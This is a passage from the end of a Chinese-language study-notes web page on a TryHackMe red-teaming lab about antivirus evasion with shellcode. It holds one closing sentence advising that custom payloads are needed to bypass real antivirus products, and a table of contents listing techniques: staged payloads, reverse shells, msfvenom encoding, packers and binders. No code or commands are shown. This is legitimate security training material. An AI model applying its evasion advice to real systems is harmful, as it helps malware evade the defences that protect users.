<p>记住，任何加密器、编码器或打包器的成功，主要取决于杀毒引擎是否识别它们的签名。因此，能够自定义自己的有效载荷，对于绕过任何真实世界的解决方案至关重要。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Introduction to Antivirus - 防病毒简介</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Obfuscation Principles - 混淆原则</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction---简介" class="table-of-contents__link toc-highlight">Introduction - 简介</a></li><li><a href="#challenge---挑战" class="table-of-contents__link toc-highlight">Challenge - 挑战</a></li><li><a href="#pe-structure---pe-结构" class="table-of-contents__link toc-highlight">PE Structure - PE 结构</a><ul><li><a href="#什么是-pe-文件" class="table-of-contents__link toc-highlight">什么是 PE 文件？</a></li><li><a href="#为什么我们需要了解-pe-结构" class="table-of-contents__link toc-highlight">为什么我们需要了解 PE 结构？</a></li><li><a href="#pe-bear" class="table-of-contents__link toc-highlight">PE-Bear</a></li></ul></li><li><a href="#introduction-to-shellcode---shellcode-简介" class="table-of-contents__link toc-highlight">Introduction to Shellcode - Shellcode 简介</a></li><li><a href="#generate-shellcode---生成-shellcode" class="table-of-contents__link toc-highlight">Generate Shellcode - 生成 Shellcode</a><ul><li><a href="#使用公共工具生成-shellcode" class="table-of-contents__link toc-highlight">使用公共工具生成 Shellcode</a></li><li><a href="#shellcode-注入" class="table-of-contents__link toc-highlight">Shellcode 注入</a></li><li><a href="#从-exe-文件生成-shellcode" class="table-of-contents__link toc-highlight">从 EXE 文件生成 Shellcode</a></li></ul></li><li><a href="#staged-payloads---分阶段有效载荷" class="table-of-contents__link toc-highlight">Staged Payloads - 分阶段有效载荷</a><ul><li><a href="#无阶段载荷" class="table-of-contents__link toc-highlight">无阶段载荷</a></li><li><a href="#分阶段载荷" class="table-of-contents__link toc-highlight">分阶段载荷</a></li><li><a href="#分阶段-vs-无阶段" class="table-of-contents__link toc-highlight">分阶段 vs. 无阶段</a></li><li><a href="#metasploit中的分阶段载荷" class="table-of-contents__link toc-highlight">Metasploit中的分阶段载荷</a></li><li><a href="#创建自定义分阶段载荷" class="table-of-contents__link toc-highlight">创建自定义分阶段载荷</a></li><li><a href="#使用我们的引导程序运行反向-shell" class="table-of-contents__link toc-highlight">使用我们的引导程序运行反向 shell</a></li></ul></li><li><a href="#introduction-to-encoding-and-encryption---编码与加密简介" class="table-of-contents__link toc-highlight">Introduction to Encoding and Encryption - 编码与加密简介</a><ul><li><a href="#什么是编码" class="table-of-contents__link toc-highlight">什么是编码？</a></li><li><a href="#什么是加密" class="table-of-contents__link toc-highlight">什么是加密？</a></li><li><a href="#为什么我们需要了解编码和加密" class="table-of-contents__link toc-highlight">为什么我们需要了解编码和加密？</a></li></ul></li><li><a href="#shellcode-encoding-and-encryption---shellcode-编码与加密" class="table-of-contents__link toc-highlight">Shellcode Encoding and Encryption - Shellcode 编码与加密</a><ul><li><a href="#使用-msfvenom-进行编码" class="table-of-contents__link toc-highlight">使用 MSFVenom 进行编码</a></li><li><a href="#使用-msfvenom-进行加密" class="table-of-contents__link toc-highlight">使用 MSFVenom 进行加密</a></li><li><a href="#创建自定义载荷" class="table-of-contents__link toc-highlight">创建自定义载荷</a></li><li><a href="#编码器" class="table-of-contents__link toc-highlight">编码器</a></li><li><a href="#自解码载荷" class="table-of-contents__link toc-highlight">自解码载荷</a></li></ul></li><li><a href="#packers---打包工具" class="table-of-contents__link toc-highlight">Packers - 打包工具</a><ul><li><a href="#打包一个应用程序" class="table-of-contents__link toc-highlight">打包一个应用程序</a></li><li><a href="#打包工具与-av" class="table-of-contents__link toc-highlight">打包工具与 AV</a></li><li><a href="#打包我们的-shellcode" class="table-of-contents__link toc-highlight">打包我们的 shellcode</a></li><li><a href="#那我们现在该怎么办" class="table-of-contents__link toc-highlight">那我们现在该怎么办？</a></li></ul></li><li><a href="#binders---捆绑工具" class="table-of-contents__link toc-highlight">Binders - 捆绑工具</a><ul><li><a href="#使用-msfvenom-进行捆绑" class="table-of-contents__link toc-highlight">使用 msfvenom 进行捆绑</a></li><li><a href="#绑定器与-av" class="table-of-contents__link toc-highlight">绑定器与 AV</a></li></ul></li><li><a href="#conclusion---结论" class="table-of-contents__link toc-highlight">Conclusion - 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">No Copyright © 2025 This is just PgDn's Notes, Sorry. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>